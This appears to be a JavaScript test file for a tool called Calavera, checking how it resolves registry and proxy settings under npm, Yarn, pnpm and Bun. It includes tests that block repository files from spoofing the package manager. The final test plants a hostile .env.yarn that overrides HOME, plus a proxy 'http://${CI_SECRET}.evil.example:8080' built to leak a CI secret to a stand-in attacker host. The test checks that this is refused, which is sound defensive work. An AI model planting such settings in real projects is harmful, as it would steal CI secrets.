    userAgent: BUN,
    env: { BUN_CONFIG_REGISTRY: "mirror.example.com/https://registry.example.com/" },
  });
  assert.equal((await loadNpmRegistryOptions(embedded)).registry.source, "default");

  const credentials = await fixture({
    userAgent: BUN,
    env: { BUN_CONFIG_REGISTRY: `https://user:${SECRET}@registry.example.com/` },
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(credentials);
  assert.equal(options.registry, "https://registry.example.com/");
  assert.deepEqual(warnings, [
    "Used BUN_CONFIG_REGISTRY from the environment without the username and password in its URL: Calavera sends no credentials to any registry.",
  ]);
  assert.doesNotMatch(inspect([options, warnings, diagnostics]), new RegExp(SECRET));

  const invalid = await fixture({ userAgent: BUN, env: { BUN_CONFIG_REGISTRY: "https://" } });
  await assert.rejects(
    loadNpmRegistryOptions(invalid),
    /^Error: The Bun setting BUN_CONFIG_REGISTRY must be an http or https URL\.$/,
  );
});

test("under Yarn, a project .yarnrc.yml proxy does not remove the home .yarnrc.yml proxy", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpsProxy: http://corp.example.com:8080\n",
      "workspace/project/.yarnrc.yml": "httpsProxy: http://team.example.com:3128\n",
    },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://corp.example.com:8080");
  assert.equal(warnings.length, 1);
  assert.match(
    warnings[0],
    /^Ignored httpsProxy in the project \.yarnrc\.yml: .*Calavera uses httpsProxy from the user \.yarnrc\.yml instead\.$/,
  );
});

test("under Bun, the first registry variable that starts with http:// or https:// wins, as in Bun", async () => {
  const files = { "home/.bunfig.toml": '[install]\nregistry = "https://file.example.com/"\n' };
  /** @type {[Record<string, string>, string, string, string][]} */
  const cases = [
    [
      { NPM_CONFIG_REGISTRY: "nope" },
      "https://file.example.com",
      "user bunfig.toml",
      "install.registry",
    ],
    [
      { npm_config_registry: "nope" },
      "https://file.example.com",
      "user bunfig.toml",
      "install.registry",
    ],
    [
      { BUN_CONFIG_REGISTRY: "nope", NPM_CONFIG_REGISTRY: "https://npm-upper.example.com/" },
      "https://npm-upper.example.com",
      "environment",
      "NPM_CONFIG_REGISTRY",
    ],
    [
      {
        BUN_CONFIG_REGISTRY: "nope",
        NPM_CONFIG_REGISTRY: "nope",
        npm_config_registry: "https://npm-lower.example.com/",
      },
      "https://npm-lower.example.com",
      "environment",
      "npm_config_registry",
    ],
    [
      {
        NPM_CONFIG_REGISTRY: "https://npm-upper.example.com/",
        npm_config_registry: "https://npm-lower.example.com/",
      },
      "https://npm-upper.example.com",
      "environment",
      "NPM_CONFIG_REGISTRY",
    ],
  ];
  for (const [env, origin, source, setting] of cases) {
    const context = await fixture({ userAgent: BUN, files, env });
    assert.deepEqual(
      (await loadNpmRegistryOptions(context)).registry,
      { origin, source, setting },
      JSON.stringify(env),
    );
  }
});

test("under Yarn, the project proxy warning names YARN_HTTPS_PROXY when that variable wins", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpsProxy: http://corp.example.com:8080\n",
      "workspace/project/.yarnrc.yml": "httpsProxy: http://team.example.com:3128\n",
    },
    env: { YARN_HTTPS_PROXY: "http://env.example.com:8080" },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://env.example.com:8080");
  assert.match(warnings[0], /Calavera uses YARN_HTTPS_PROXY from the environment instead\.$/);
});

test("under Yarn, a rejected project proxy warning names the proxy Yarn uses for the registry protocol", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpsProxy: http://corp.example.com:8080\n",
      "workspace/project/.yarnrc.yml": "httpProxy: http://team.example.com:3128\n",
    },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://corp.example.com:8080");
  assert.match(
    warnings[0],
    /^Ignored httpProxy in the project \.yarnrc\.yml: .*Calavera uses httpsProxy from the user \.yarnrc\.yml instead\.$/,
  );

  const unused = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpProxy: http://corp.example.com:8080\n",
      "workspace/project/.yarnrc.yml": "httpsProxy: http://team.example.com:3128\n",
    },
  });
  const unusedResult = await loadNpmRegistryOptions(unused);
  assert.equal(unusedResult.options.proxy, undefined);
  assert.match(
    unusedResult.warnings[0],
    /No other proxy setting applies\. To use it, set it in your user \.yarnrc\.yml\.$/,
  );
});

test("under bun run, npm_config_local_prefix does not move the project .npmrc, because only npm exports its settings", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/.npmrc": "registry=https://cwd.example.com/\n",
      "workspace/.npmrc": "registry=https://prefix.example.com/\n",
    },
    env: { npm_command: "run-script", npm_lifecycle_event: "start" },
  });
  context.env.npm_config_local_prefix = join(context.cwd, "..");
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://cwd.example.com/",
  );
});

test("outside a package manager, a proxy in the user file that npm_config_userconfig chose applies", async () => {
  const context = await fixture({
    files: { "workspace/chosen.npmrc": "https-proxy=http://corp.example.com:8080/\n" },
  });
  context.env.npm_config_userconfig = join(context.cwd, "..", "chosen.npmrc");
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.httpsProxy,
    "http://corp.example.com:8080/",
  );
});

test("under Yarn, a rejected project proxy for the other protocol says Yarn would not use it", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": "httpProxy: http://team.example.com:3128\n" },
  });
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.match(
    warnings[0],
    /^Ignored httpProxy in the project \.yarnrc\.yml: .*Yarn uses it only for http registries, and the registry is https\.$/,
  );
});

/** The project folder of the fixture the previous test created. */
let previousFixtureFolder = "";

test("a fixture folder exists during its test", async () => {
  const context = await fixture({
    files: { "workspace/project/.npmrc": "registry=https://registry.example.com/\n" },
  });
  previousFixtureFolder = context.cwd;
  await access(previousFixtureFolder);
});

test("the previous test's fixture folder is removed after that test", async () => {
  assert.notEqual(previousFixtureFolder, "");
  await assert.rejects(access(previousFixtureFolder), { code: "ENOENT" });
});

test("under Bun, npm_config_@scope:registry still sets the artifact scope's registry, but npm_config_registry gives way to Bun's order", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: { "home/.bunfig.toml": '[install]\nregistry = "https://file.example.com/"\n' },
    env: { [`npm_config_${SCOPE}:registry`]: "https://scoped-env.example.com/" },
  });
  const { options, registry } = await loadNpmRegistryOptions(context);
  assert.equal(options[`${SCOPE}:registry`], "https://scoped-env.example.com/");
  assert.equal(options.registry, "https://file.example.com/");
  assert.deepEqual(registry, {
    origin: "https://scoped-env.example.com",
    source: "environment",
    setting: `${SCOPE}:registry`,
  });
});

// #1186: repository content cannot change which package manager's settings Calavera reads. npm
// exports a project .npmrc `user-agent`, and pnpm its `userAgent` setting from
// pnpm-workspace.yaml, as npm_config_user_agent, but both set npm_execpath to their own binary.
// The environments below are the shapes probed with npm 11.20, pnpm 12.9, Yarn 4.18, and Bun 1.3.9.
const NPM_EXECPATH = "/usr/local/lib/node_modules/npm/bin/npm-cli.js";
const PNPM_EXECPATH =
  "/Users/probe/Library/pnpm/.tools/pnpm/12.9.1/node_modules/@pnpm/exe.darwin-arm64/pnpm";

test("detectLauncher trusts npm_execpath over a user agent that npm or pnpm exported from a project file", () => {
  /** @type {[Record<string, string>, string][]} */
  const cases = [
    [{ npm_execpath: NPM_EXECPATH, npm_config_user_agent: YARN }, "npm"],
    [{ npm_execpath: NPM_EXECPATH, npm_config_user_agent: BUN }, "npm"],
    [
      {
        npm_execpath: "C:\\Program Files\\nodejs\\node_modules\\npm\\bin\\npm-cli.js",
        npm_config_user_agent: BUN,
      },
      "npm",
    ],
    [{ npm_execpath: PNPM_EXECPATH, npm_config_user_agent: BUN }, "npm"],
    [
      {
        npm_execpath: "/usr/local/lib/node_modules/pnpm/bin/pnpm.cjs",
        npm_config_user_agent: YARN,
      },
      "npm",
    ],
    [
      {
        npm_execpath: "C:\\Users\\probe\\AppData\\Local\\pnpm\\pnpm.exe",
        npm_config_user_agent: YARN,
      },
      "npm",
    ],
    // Yarn and Bun set both themselves, and repository content cannot change either.
    [{ npm_execpath: "/private/tmp/xfs-c92579a3/yarn", npm_config_user_agent: YARN }, "yarn"],
    [{ npm_execpath: "/Users/probe/.bun/bin/bun", npm_config_user_agent: BUN }, "bun"],
    // Only the whole file name counts, so a wrapper whose name merely contains npm or pnpm does not.
    [{ npm_execpath: "/opt/tools/pnpm-to-bun", npm_config_user_agent: BUN }, "bun"],
    [{ npm_execpath: "/opt/tools/not-npm-cli.js", npm_config_user_agent: YARN }, "yarn"],
    // Without npm_execpath, as when the variable is set by hand, the user agent still counts.
    [{ npm_config_user_agent: YARN }, "yarn"],
    [{ npm_config_user_agent: BUN }, "bun"],
    [{}, "npm"],
  ];
  for (const [env, launcher] of cases) {
    assert.equal(detectLauncher(env), launcher, env.npm_execpath ?? "no npm_execpath");
  }
});

test("a project .npmrc user-agent exported by npm does not switch Calavera to the Yarn settings", async () => {
  const context = await fixture({
    files: {
      "home/.npmrc": "https-proxy=http://user-proxy.example.com:8080/\n",
      "workspace/project/.npmrc": "user-agent=yarn/4.9.1 npm/? node/x\n",
      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://yarn-mirror.example.com\n",
    },
  });
  const result = await loadNpmRegistryOptions({
    ...context,
    env: {
      ...context.env,
      npm_execpath: NPM_EXECPATH,
      npm_command: "exec",
      npm_config_local_prefix: context.cwd,
      npm_config_user_agent: "yarn/4.9.1 npm/? node/x",
    },
  });
  assert.equal(result.options.httpsProxy, "http://user-proxy.example.com:8080/");
  assert.equal(result.registry.origin, "https://registry.npmjs.org");
});

test("a pnpm userAgent in pnpm-workspace.yaml does not switch Calavera to the Bun settings", async () => {
  const context = await fixture({
    files: {
      "home/.npmrc": "https-proxy=http://user-proxy.example.com:8080/\n",
      "workspace/project/pnpm-workspace.yaml": "userAgent: bun/1.3.9 npm/? node/x\n",
      "workspace/project/bunfig.toml": '[install]\nregistry = "https://bun-mirror.example.com/"\n',
    },
  });
  const result = await loadNpmRegistryOptions({
    ...context,
    env: {
      ...context.env,
      npm_execpath: PNPM_EXECPATH,
      npm_command: "exec",
      npm_config_user_agent: "bun/1.3.9 npm/? node/x",
    },
  });
  // Bun does not read .npmrc proxies, so the user proxy shows that the npm settings were read.
  assert.equal(result.options.httpsProxy, "http://user-proxy.example.com:8080/");
  assert.equal(result.registry.origin, "https://registry.npmjs.org");
});

test("a Yarn 4 .env.yarn cannot switch Calavera to the npm settings or choose the user .yarnrc.yml it expands", async () => {
  const context = await fixture({
    files: {
      "home/.yarnrc.yml": "httpsProxy: http://user-proxy.example.com:8080\n",
      "workspace/project/evilhome/.yarnrc.yml":
        "httpsProxy: http://${CI_SECRET}.evil.example:8080\n",
      "workspace/project/evil.npmrc": "registry=https://npm-mirror.example.com/\n",
      "workspace/project/.env.yarn":
        "npm_command=exec\nHOME=./evilhome\nnpm_config_userconfig=./evil.npmrc\n",
    },
  });
  // Yarn 4.18 applies .env.yarn to the binaries it runs, then sets npm_execpath and
  // npm_config_user_agent itself, so the user agent stays Yarn's, but HOME, npm_command, and
  // npm_config_userconfig come from the file.
  const result = await loadNpmRegistryOptions({
    ...context,
    env: {
      HOME: join(context.cwd, "evilhome"),
      CI_SECRET: SECRET,
      npm_execpath: "/private/tmp/xfs-c92579a3/yarn",
      npm_config_user_agent: YARN,
      npm_command: "exec",
      npm_config_userconfig: "./evil.npmrc",
    },
  });
  assert.equal(result.registry.origin, "https://registry.yarnpkg.com");
  assert.equal(result.options.proxy, undefined);
  assert.deepEqual(result.warnings, [
    "Ignored httpsProxy in the user .yarnrc.yml: Calavera expands variables only in your own .yarnrc.yml in your account's home folder and in environment variables, never in a file that a variable or a project file names.",
  ]);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET));
});
